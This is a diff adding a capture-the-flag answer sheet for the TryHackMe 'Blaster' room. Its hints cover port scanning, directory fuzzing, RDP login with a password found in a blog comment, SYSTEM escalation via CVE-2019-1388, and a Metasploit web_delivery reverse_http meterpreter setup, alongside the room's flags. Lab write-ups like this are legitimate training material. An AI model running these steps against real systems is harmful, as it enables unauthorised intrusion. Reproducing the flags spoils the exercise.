@@ -1,0 +1,87 @@
+#Task 2 Activate Forward Scanners and Launch Proton Torpedoes 
+- How many ports are open on our target system?
+hint: nmap -sS -sV -Pn -vv $ip
+2
+
+
+- Looks like there's a web server running, what is the title of the page we discover when browsing to it?
+hint: curl $ip
+IIS Windows Server
+
+
+- Interesting, let's see if there's anything else on this web server by fuzzing it. What hidden directory do we discover?
+hint: gobuster -u dir http://$ip/ -w /usr/share/wordlist/dirbuster/directory...txt
+/retro
+
+
+- Navigate to our discovered hidden directory, what potential username do we discover?
+hint: firefox http://ip/retro
+or curl http://$ip/retro
+wade
+
+
+- Crawling through the posts, it seems like our user has had some difficulties logging in recently. What possible password do we discover?
+hint: search in web http://ip/retro ...comment
+parzival
+
+
+- Log into the machine via Microsoft Remote Desktop (MSRDP) and read user.txt. What are it's contents?
+hint: remote desktop to $IP
+notepad user.txt
+THM{HACK_PLAYER_ONE}
+
+
+#Task 3 Breaching the Control Room 
+- When enumerating a machine, it's often useful to look at what the user was last doing. Look around the machine and see if you can find the CVE which was researched on this server. What CVE was it?
+hint: google hhupd.exe
+or on target machine turn IE --> history
+CVE-2019-1388
+
+
+
+- Looks like an executable file is necessary for exploitation of this vulnerability and the user didn't really clean up very well after testing it. What is the name of this executable?
+hint: on Desktop view hhupd.exe
+hhupd
+
+
+- Now that we've spawned a terminal, let's go ahead and run the command 'whoami'. What is the output of running this?
+hint: right click hhupd.exe --> run administrator --> other...
+turn IE ---> save as --> c:\windows\system32\  --> right click cmd.exe --> open
+whoami
+AUTHORITY\SYSTEM
+
+
+- Now that we've confirmed that we have an elevated prompt, read the contents of root.txt on the Administrator's desktop. What are the contents? Keep your terminal up after exploitation so we can use it in task four!
+hint: cd c:\user\administrator\Desktop
+type root.txt
+THM{COIN_OPERATED_EXPLOITATION}
+
+
+#Task 4 Adoption into the Collective 
+- First, let's set the target to PSH (PowerShell). Which target number is PSH?
+hint: on kali machine
+msfconsole
+msf6>use exploit/multi/script/web_delivery
+show targets
+...
+2
+
+
+- Last but certainly not least, let's look at persistence mechanisms via Metasploit. What command can we run in our meterpreter console to setup persistence which automatically starts when the system boots? Don't include anything beyond the base command and the option for boot startup. 
+hint: msf6>use exploit/multi/script/web_delivery
+set payload windows/meterpreter/reverse_http
+set target 2
+set lhost myip
+run -j
+
+
+
+https://tryhackme.com/room/blaster
+https://infosecwriteups.com/blaster-walkthrough-tryhackme-f44f0adb6814
+https://stawm.design.blog/2020/05/11/blaster-tryhackme-writeup/
+https://www.aldeid.com/wiki/TryHackMe-Blaster
+https://musyokaian.medium.com/blaster-tryhackme-cve-2019-1388-a5f712548e29
+https://github.com/Voker2311/CaptureTheFlag-walkthroughs/blob/master/blaster%20Tryhackme%20Tutorial
+
+
+
